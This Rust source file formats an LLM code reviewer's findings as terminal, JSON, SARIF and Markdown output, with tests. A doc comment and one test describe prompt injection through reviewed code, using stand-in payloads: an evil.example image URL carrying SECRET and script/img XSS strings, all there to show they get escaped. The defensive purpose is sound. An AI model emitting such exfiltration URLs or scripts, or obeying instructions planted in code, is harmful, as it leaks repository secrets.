//! Rendering findings: coloured terminal text, JSON, SARIF, and Markdown.

use crate::cli::OutputFormat;
use core_engine::{AnalysisStats, Category, ReviewFinding, ReviewSummary, Severity, to_sarif};
use crossterm::style::Stylize;

pub const VERSION: &str = env!("CARGO_PKG_VERSION");

// ─── Terminal ────────────────────────────────────────────────────────────────

fn severity_badge(f: &ReviewFinding) -> String {
    match f.severity {
        Severity::High => format!("{}", " HIGH ".on_red().white().bold()),
        Severity::Medium => format!("{}", " MED  ".on_dark_yellow().white().bold()),
        Severity::Low => format!("{}", " LOW  ".on_dark_cyan().white().bold()),
    }
}

fn category_icon(f: &ReviewFinding) -> &'static str {
    match f.category {
        Category::Security => "🔒",
        Category::Quality => "🐛",
        Category::Performance => "⚡",
        Category::Maintainability => "📐",
        Category::Compliance => "📋",
    }
}

pub fn wrap_text(text: &str, indent: usize, width: usize) -> String {
    let pad = " ".repeat(indent);
    let mut lines = Vec::new();
    let mut current = String::new();
    for word in text.split_whitespace() {
        if current.is_empty() {
            current.push_str(word);
        } else if current.chars().count() + 1 + word.chars().count() <= width {
            current.push(' ');
            current.push_str(word);
        } else {
            lines.push(format!("{pad}{current}"));
            current = word.to_string();
        }
    }
    if !current.is_empty() {
        lines.push(format!("{pad}{current}"));
    }
    lines.join("\n")
}

/// Build a fully-formatted, ANSI-coloured string for one finding.
/// `counter` is a short label shown on the header row, e.g. `"#1"`.
pub fn format_finding(f: &ReviewFinding, counter: &str) -> String {
    let loc = format!("{}:{}", f.file, f.line).dark_grey();
    let counter_label = format!("[{counter}]").dark_grey();
    // Surfacing the rule ID is what makes suppression discoverable: users need
    // to know what to write in `// diffmind-ignore-next-line …`.
    let rule = format!("({})", f.rule_id()).dark_grey();

    let mut out = String::new();

    out.push_str(&format!(
        "\n  {}  {}  {}  {} {} {}\n",
        severity_badge(f),
        category_icon(f),
        format!("{:?}", f.category).to_lowercase().dark_grey(),
        loc,
        counter_label,
        rule,
    ));
    out.push_str(&format!("  {}\n", "─".repeat(62).dark_grey()));

    let issue = wrap_text(&f.issue, 10, 68);
    let mut issue_lines = issue.lines();
    out.push_str(&format!(
        "  {}  {}\n",
        "Issue".red().bold(),
        issue_lines.next().unwrap_or("").trim_start()
    ));
    for line in issue_lines {
        out.push_str(&format!("{line}\n"));
    }

    if !f.suggested_fix.trim().is_empty() {
        let fix = wrap_text(&f.suggested_fix, 10, 68);
        let mut fix_lines = fix.lines();
        out.push_str(&format!(
            "  {}    {}\n",
            "Fix".green().bold(),
            fix_lines.next().unwrap_or("").trim_start()
        ));
        for line in fix_lines {
            out.push_str(&format!("{line}\n"));
        }
    }

    out
}

pub fn print_positives_and_suggestions(positives: &[String], suggestions: &[String]) {
    if positives.is_empty() && suggestions.is_empty() {
        return;
    }

    if !positives.is_empty() {
        eprintln!("  {}", "─".repeat(62).dark_grey());
        eprintln!("  {}  What looks good", "✓".green().bold());
        for p in positives {
            eprintln!("     {}  {}", "·".green(), p);
        }
        eprintln!();
    }

    if !suggestions.is_empty() {
        if positives.is_empty() {
            eprintln!("  {}", "─".repeat(62).dark_grey());
        }
        eprintln!("  💡  Suggestions");
        for s in suggestions {
            eprintln!("     {}  {}", "·".dark_yellow(), s);
        }
        eprintln!();
    }
}

/// One line describing what the run cost.
///
/// Deliberately backend-shaped. On the bundled local model the currency is
/// seconds and throughput — tokens are free and a token budget would be
/// meaningless. On a metered endpoint tokens are the number that matters. The
/// `~` marks counts the backend could not tokenise exactly, because a budget
/// tracked against a silent guess is worse than one that admits it is guessing.
pub fn cost_line(stats: &AnalysisStats) -> String {
    let seconds = stats.inference_ms as f64 / 1000.0;
    let elapsed = if seconds < 60.0 {
        format!("{seconds:.1}s")
    } else {
        format!("{}m {:02}s", (seconds as u64) / 60, (seconds as u64) % 60)
    };

    let approx = if stats.tokens_estimated { "~" } else { "" };
    let mut line = format!(
        "{elapsed}  ·  {approx}{} tokens ({approx}{} in, {approx}{} out)",
        stats.total_tokens(),
        stats.prompt_tokens,
        stats.completion_tokens
    );
    if let Some(tps) = stats.tokens_per_second() {
        line.push_str(&format!("  ·  {tps:.0} tok/s"));
    }
    line
}

pub fn print_footer(shown: usize, gated: usize, stats: &AnalysisStats, required: bool) {
    eprintln!("  {}", "─".repeat(62).dark_grey());

    if let Some(err) = &stats.backend_error {
        eprintln!(
            "  {}  review FAILED part-way: {} of {} unit{} not reviewed — {}",
            "✗".red().bold(),
            stats.units_failed,
            stats.units_total,
            plural(stats.units_total),
            err
        );
    }

    if stats.units_unparseable > 0 {
        eprintln!(
            "  {}  {} chunk{} produced unusable output — try a larger --model",
            "!".yellow(),
            stats.units_unparseable,
            plural(stats.units_unparseable)
        );
    }
    if stats.units_too_large > 0 {
        eprintln!(
            "  {}  {} unit{} too large for the context window — skipped, not reviewed",
            "!".yellow(),
            stats.units_too_large,
            plural(stats.units_too_large)
        );
    }
    if stats.suppressed > 0 {
        eprintln!(
            "  {}  {} finding{} suppressed (inline comments or baseline)",
            "·".dark_grey(),
            stats.suppressed,
            plural(stats.suppressed)
        );
    }
    if stats.unanchorable > 0 {
        eprintln!(
            "  {}  {} model finding{} discarded — pointed at files not in the diff",
            "·".dark_grey(),
            stats.unanchorable,
            plural(stats.unanchorable)
        );
    }
    if stats.below_confidence > 0 {
        eprintln!(
            "  {}  {} finding{} below --min-confidence",
            "·".dark_grey(),
            stats.below_confidence,
            plural(stats.below_confidence)
        );
    }
    if stats.files_skipped_by_triage > 0 {
        eprintln!(
            "  {}  {} low-risk file{} skipped by triage",
            "·".dark_grey(),
            stats.files_skipped_by_triage,
            plural(stats.files_skipped_by_triage)
        );
    }
    if stats.units_cached > 0 {
        eprintln!(
            "  {}  {}/{} unit{} served from cache",
            "·".dark_grey(),
            stats.units_cached,
            stats.units_total,
            plural(stats.units_total)
        );
    }

    // What the run cost. Displayed every time on purpose: a budget nobody sees
    // is a budget nobody notices regressing.
    if stats.inference_ms > 0 {
        eprintln!("  {}  {}", "·".dark_grey(), cost_line(stats));
    }

    let incomplete = !stats.is_complete();
    if incomplete {
        let consequence = if stats.backend_error.is_some() || required {
            "the review is incomplete  (exit 2)".red().to_string()
        } else {
            "the result covers only the units that were reviewed"
                .yellow()
                .to_string()
        };
        eprintln!(
            "  {}  {} of {} unit{} not reviewed — {}",
            "!".yellow().bold(),
            stats.units_skipped(),
            stats.units_total,
            plural(stats.units_total),
            consequence
        );
    }

    if shown == 0 && incomplete {
        eprintln!(
            "  {}  No issues found in the {} unit{} that were reviewed.",
            "·".dark_grey(),
            stats.units_reviewed(),
            plural(stats.units_reviewed())
        );
    } else if shown == 0 {
        eprintln!("  {}  No issues found.", "✓".green().bold());
    } else {
        let gate = if gated > 0 {
            format!("{} at or above the fail threshold  (exit 1)", gated)
                .red()
                .to_string()
        } else {
            "none at the fail threshold  (exit 0)"
                .dark_grey()
                .to_string()
        };
        eprintln!(
            "  {}  {} finding{}  ·  {}",
            "⚠".yellow().bold(),
            shown,
            plural(shown),
            gate
        );
    }
    eprintln!();
}

fn plural(n: usize) -> &'static str {
    if n == 1 { "" } else { "s" }
}

// ─── Machine-readable ────────────────────────────────────────────────────────

pub fn render(
    format: OutputFormat,
    summary: &ReviewSummary,
    stats: &AnalysisStats,
    model: &str,
    required: bool,
) -> String {
    let completeness = stats.completeness(required);
    match format {
        OutputFormat::Json => serde_json::to_string_pretty(&serde_json::json!({
            "version": VERSION,
            "model": model,
            "findings": summary.findings,
            "positives": summary.positives,
            "suggestions": summary.suggestions,
            "stats": {
                "units": stats.units_total,
                "units_cached": stats.units_cached,
                "units_unparseable": stats.units_unparseable,
                "units_too_large": stats.units_too_large,
                "inference_ms": stats.inference_ms,
                "prompt_tokens": stats.prompt_tokens,
                "completion_tokens": stats.completion_tokens,
                "tokens_estimated": stats.tokens_estimated,
                "suppressed": stats.suppressed,
                "discarded_unanchorable": stats.unanchorable,
                "below_confidence": stats.below_confidence,
                "files_skipped_by_triage": stats.files_skipped_by_triage,
                "units_failed": stats.units_failed,
            },
            // Added in 0.9.3. Existing consumers ignore it; a gate that wants
            // to know whether "no findings" covers the whole diff reads
            // `completeness.trustworthy`.
            "completeness": completeness,
        }))
        .unwrap_or_else(|e| format!("{{\"error\":\"{e}\"}}")),

        OutputFormat::Sarif => {
            let mut sarif = to_sarif(summary, VERSION, model);
            core_engine::attach_completeness(&mut sarif, &completeness);
            serde_json::to_string_pretty(&sarif)
                .unwrap_or_else(|e| format!("{{\"error\":\"{e}\"}}"))
        }

        OutputFormat::Markdown => markdown(summary, stats, model, required),

        // Text is streamed to stderr as findings arrive, so there is no
        // document to return here.
        OutputFormat::Text => String::new(),
    }
}

pub fn markdown(
    summary: &ReviewSummary,
    stats: &AnalysisStats,
    model: &str,
    required: bool,
) -> String {
    let mut out = String::from("## diffmind code review\n\n");

    // Said first, before any "No issues found": that sentence is only true of
    // the units that were actually reviewed.
    if !stats.is_complete() {
        let verdict = if stats.backend_error.is_some() {
            "**Review failed part-way.**"
        } else if required {
            "**Review incomplete — this run fails.**"
        } else {
            "**Review incomplete.**"
        };
        out.push_str(&format!(
            "> [!WARNING]\n> {verdict} {} of {} unit{} were not reviewed \
             ({} unparseable, {} too large, {} backend failure). \
             A clean result says nothing about them.\n\n",
            stats.units_skipped(),
            stats.units_total,
            plural(stats.units_total),
            stats.units_unparseable,
            stats.units_too_large,
            stats.units_failed,
        ));
    }

    if summary.findings.is_empty() {
        if stats.is_complete() {
            out.push_str("No issues found.\n\n");
        } else {
            out.push_str("No issues found in the units that were reviewed.\n\n");
        }
    } else {
        let high = summary
            .findings
            .iter()
            .filter(|f| f.severity == Severity::High)
            .count();
        let medium = summary
            .findings
            .iter()
            .filter(|f| f.severity == Severity::Medium)
            .count();
        let low = summary
            .findings
            .iter()
            .filter(|f| f.severity == Severity::Low)
            .count();
        out.push_str(&format!(
            "**{} finding{}** — {high} high, {medium} medium, {low} low\n\n",
            summary.findings.len(),
            plural(summary.findings.len())
        ));

        out.push_str("| Severity | Location | Rule | Issue |\n|---|---|---|---|\n");
        for f in &summary.findings {
            out.push_str(&format!(
                "| {} | {} | {} | {} |\n",
                f.severity.as_str(),
                code_span(&format!("{}:{}", f.file, f.line)),
                code_span(&f.rule_id()),
                escape_markdown(&f.issue),
            ));
        }
        out.push('\n');

        out.push_str("<details><summary>Suggested fixes</summary>\n\n");
        for f in &summary.findings {
            if f.suggested_fix.trim().is_empty() {
                continue;
            }
            out.push_str(&format!(
                "- **{}** — {}\n",
                code_span(&format!("{}:{}", f.file, f.line)),
                escape_markdown(&f.suggested_fix)
            ));
        }
        out.push_str("\n</details>\n\n");
    }

    if !summary.positives.is_empty() {
        out.push_str("### What looks good\n\n");
        for p in &summary.positives {
            out.push_str(&format!("- {}\n", escape_markdown(p)));
        }
        out.push('\n');
    }

    if !summary.suggestions.is_empty() {
        out.push_str("### Suggestions\n\n");
        for s in &summary.suggestions {
            out.push_str(&format!("- {}\n", escape_markdown(s)));
        }
        out.push('\n');
    }

    out.push_str(&format!(
        "<sub>diffmind {VERSION} · {} · {}/{} chunk{} analyzed",
        escape_markdown(model),
        stats.units_reviewed(),
        stats.units_total,
        plural(stats.units_total)
    ));
    if stats.suppressed > 0 {
        out.push_str(&format!(" · {} suppressed", stats.suppressed));
    }
    out.push_str("</sub>\n");

    out
}

/// Make model-written text inert Markdown.
///
/// The report is posted as a PR comment and a job summary, both rendered by
/// GitHub. Model text derives from the code under review, so a planted
/// instruction can make it emit an image (`![](https://attacker/?q=<secret>)`,
/// fetched as soon as the comment renders — an exfiltration channel), raw
/// HTML, links or `@`-mentions that notify strangers. Every character that
/// Markdown or HTML would interpret is escaped, `@` is neutralised, and
/// newlines are flattened so text cannot break out of its table cell.
fn escape_markdown(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    for c in s.chars() {
        match c {
            '\n' | '\r' => out.push(' '),
            '&' => out.push_str("&amp;"),
            '<' => out.push_str("&lt;"),
            '>' => out.push_str("&gt;"),
            '@' => out.push_str("&#64;"),
            '\\' | '`' | '*' | '_' | '[' | ']' | '(' | ')' | '!' | '|' | '#' | '~' => {
                out.push('\\');
                out.push(c);
            }
            _ => out.push(c),
        }
    }
    out
}

/// Inline code that cannot be closed early by a backtick in the content.
fn code_span(s: &str) -> String {
    let flat: String = s
        .chars()
        .map(|c| if c == '\n' || c == '\r' { ' ' } else { c })
        .collect();
    let longest = flat.split(|c| c != '`').map(str::len).max().unwrap_or(0);
    let fence = "`".repeat(longest + 1);
    // A pipe would still end the table cell inside a code span.
    let body = flat.replace('|', "\\|");
    if body.starts_with('`') || body.ends_with('`') {
        format!("{fence} {body} {fence}")
    } else {
        format!("{fence}{body}{fence}")
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn finding(sev: Severity, issue: &str) -> ReviewFinding {
        ReviewFinding {
            file: "src/a.rs".into(),
            line: 7,
            severity: sev,
            category: Category::Security,
            issue: issue.into(),
            suggested_fix: "do the other thing".into(),
            confidence: Some(0.9),
            rule_id: Some("DM001".into()),
            rule: None,
            unit_id: None,
        }
    }

    fn summary() -> ReviewSummary {
        ReviewSummary {
            findings: vec![finding(Severity::High, "hardcoded secret")],
            positives: vec!["good naming".into()],
            suggestions: vec!["add a test".into()],
        }
    }

    #[test]
    fn json_output_is_valid_and_carries_stats() {
        let s = render(
            OutputFormat::Json,
            &summary(),
            &AnalysisStats::default(),
            "m",
            false,
        );
        let v: serde_json::Value = serde_json::from_str(&s).expect("must be valid JSON");
        assert_eq!(v["findings"].as_array().unwrap().len(), 1);
        assert_eq!(v["findings"][0]["rule_id"], "DM001");
        assert!(v["stats"].is_object());
    }

    #[test]
    fn sarif_output_is_valid() {
        let s = render(
            OutputFormat::Sarif,
            &summary(),
            &AnalysisStats::default(),
            "m",
            false,
        );
        let v: serde_json::Value = serde_json::from_str(&s).unwrap();
        assert_eq!(v["version"], "2.1.0");
    }

    #[test]
    fn markdown_escapes_pipes_so_the_table_survives() {
        let mut s = summary();
        s.findings[0].issue = "use a || b, not a | b".into();
        let md = render(
            OutputFormat::Markdown,
            &s,
            &AnalysisStats::default(),
            "m",
            false,
        );
        let row = md.lines().find(|l| l.contains("src/a.rs")).unwrap();

        // Splitting on unescaped pipes must still yield exactly the four
        // declared columns; an unescaped `|` in the issue would add more.
        let cells = split_unescaped_pipes(row);
        assert_eq!(
            cells.len(),
            4,
            "row split into the wrong number of cells: {row}"
        );
        assert!(
            cells[3].contains("\\|"),
            "the issue's pipes should be escaped: {row}"
        );
    }

    /// Split a markdown table row on delimiters, honouring `\|` escapes.
    fn split_unescaped_pipes(row: &str) -> Vec<String> {
        let mut cells = Vec::new();
        let mut current = String::new();
        let mut escaped = false;
        for c in row
            .trim()
            .trim_start_matches('|')
            .trim_end_matches('|')
            .chars()
        {
            if escaped {
                current.push(c);
                escaped = false;
            } else if c == '\\' {
                current.push(c);
                escaped = true;
            } else if c == '|' {
                cells.push(current.trim().to_string());
                current = String::new();
            } else {
                current.push(c);
            }
        }
        cells.push(current.trim().to_string());
        cells
    }

    /// Model text comes from code under review, so planted instructions can
    /// steer it. Rendered in a PR comment, an image is fetched immediately —
    /// a way to smuggle repository content out in a URL — and HTML, links and
    /// mentions are live. None of that may survive into the Markdown.
    #[test]
    fn markdown_neutralises_images_links_html_and_mentions_in_model_text() {
        let mut s = summary();
        s.findings[0].issue =
            "see ![x](https://evil.example/?q=SECRET) <img src=x onerror=alert(1)> @octocat [click](https://evil.example)".into();
        s.findings[0].suggested_fix = "<script>alert(1)</script> **bold** `code`".into();
        s.positives = vec!["![p](https://evil.example/p.png)".into()];
        s.suggestions = vec!["<details open>".into()];
        let md = render(
            OutputFormat::Markdown,
            &s,
            &AnalysisStats::default(),
            "m",
            false,
        );

        for live in ["![", "](", "<img", "<script", "<details open", "@octocat"] {
            assert!(!md.contains(live), "{live:?} survived:\n{md}");
        }
        assert!(
            md.contains("&lt;img"),
            "HTML is shown as text, not dropped:\n{md}"
        );
        assert!(md.contains("&#64;octocat"));
    }

    #[test]
    fn a_backtick_in_a_path_cannot_close_its_code_span() {
        assert_eq!(code_span("a.rs:1"), "`a.rs:1`");
        let span = code_span("we`ird.rs:3");
        assert!(span.starts_with("``") && span.ends_with("``"), "{span}");
    }

    #[test]
    fn an_incomplete_review_is_never_rendered_as_clean() {
        let stats = AnalysisStats {
            units_total: 3,
            units_unparseable: 1,
            ..Default::default()
        };
        let md = render(
            OutputFormat::Markdown,
            &ReviewSummary::default(),
            &stats,
            "m",
            true,
        );
        assert!(md.contains("Review incomplete"), "{md}");
        assert!(!md.contains("\nNo issues found.\n"), "{md}");

        let json: serde_json::Value = serde_json::from_str(&render(
            OutputFormat::Json,
            &ReviewSummary::default(),
            &stats,
            "m",
            true,
        ))
        .unwrap();
        assert_eq!(json["completeness"]["status"], "incomplete");
        assert_eq!(json["completeness"]["trustworthy"], false);
        assert_eq!(json["completeness"]["units_reviewed"], 2);
        assert_eq!(json["completeness"]["required"], true);

        let sarif: serde_json::Value = serde_json::from_str(&render(
            OutputFormat::Sarif,
            &ReviewSummary::default(),
            &stats,
            "m",
            true,
        ))
        .unwrap();
        assert_eq!(
            sarif["runs"][0]["invocations"][0]["executionSuccessful"],
            false
        );
        assert_eq!(
            sarif["runs"][0]["properties"]["completeness"]["status"],
            "incomplete"
        );
    }

    #[test]
    fn a_complete_review_reports_success_in_every_format() {
        let stats = AnalysisStats {
            units_total: 2,
            ..Default::default()
        };
        let json: serde_json::Value =
            serde_json::from_str(&render(OutputFormat::Json, &summary(), &stats, "m", true))
                .unwrap();
        assert_eq!(json["completeness"]["status"], "complete");
        assert_eq!(json["completeness"]["trustworthy"], true);
        let sarif: serde_json::Value =
            serde_json::from_str(&render(OutputFormat::Sarif, &summary(), &stats, "m", true))
                .unwrap();
        assert_eq!(
            sarif["runs"][0]["invocations"][0]["executionSuccessful"],
            true
        );
        // The pre-0.9.3 shape is still there for existing consumers.
        assert!(json["stats"]["units_unparseable"].is_number());
        assert!(sarif["runs"][0]["results"].is_array());
    }

    #[test]
    fn markdown_flattens_newlines_out_of_a_table_cell() {
        let mut s = summary();
        s.findings[0].issue = "line one\nline two".into();
        let md = render(
            OutputFormat::Markdown,
            &s,
            &AnalysisStats::default(),
            "m",
            false,
        );
        let row = md.lines().find(|l| l.contains("src/a.rs")).unwrap();
        assert!(
            row.contains("line one line two"),
            "a newline would break the table"
        );
    }

    #[test]
    fn markdown_reports_no_issues_cleanly() {
        let md = render(
            OutputFormat::Markdown,
            &ReviewSummary::default(),
            &AnalysisStats::default(),
            "m",
            false,
        );
        assert!(md.contains("No issues found."));
        assert!(!md.contains("| Severity |"));
    }

    #[test]
    fn text_format_returns_nothing_because_it_streams() {
        assert!(
            render(
                OutputFormat::Text,
                &summary(),
                &AnalysisStats::default(),
                "m",
                false
            )
            .is_empty()
        );
    }

    #[test]
    fn format_finding_shows_the_rule_id_for_suppression() {
        let out = format_finding(&finding(Severity::High, "boom"), "#1");
        assert!(
            out.contains("DM001"),
            "users cannot suppress what is not shown"
        );
        assert!(out.contains("src/a.rs:7"));
    }

    #[test]
    fn wrap_text_respects_width_on_multibyte_input() {
        let wrapped = wrap_text("ünïcödé wörds thät müst wräp cleanly here", 2, 12);
        for line in wrapped.lines() {
            assert!(line.chars().count() <= 14, "line too long: {line:?}");
        }
    }

    #[test]
    fn a_finding_without_a_fix_omits_the_fix_row() {
        let mut f = finding(Severity::Low, "minor");
        f.suggested_fix = "  ".into();
        let out = format_finding(&f, "#1");
        assert!(!out.contains("Fix"));
    }
}
